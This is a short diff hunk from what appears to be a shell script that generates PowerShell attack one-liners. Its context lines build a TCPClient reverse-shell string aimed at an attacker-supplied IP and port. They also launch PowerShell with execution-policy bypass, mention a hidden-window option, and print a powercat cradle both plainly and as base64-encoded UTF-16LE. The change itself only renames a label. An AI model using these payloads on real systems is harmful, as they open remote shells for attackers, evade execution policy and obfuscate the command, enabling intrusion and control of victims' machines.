@@ -21,7 +21,7 @@ shell="\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream 
 invoke_ps="powershell -nop -noni -ep bypass" # Add "-w hidden" to hide the window (can break powercat in cmd)
 
 # Cradles
-echo -e "\n<== powercat (interactive) ==>\n"
+echo -e "\n<== powercat ==>\n"
 echo -e "$invoke_ps -c \"$powercat\"\n"
 echo "$invoke_ps -e $(echo $powercat | iconv -t utf-16le | base64 -w 0)"
 
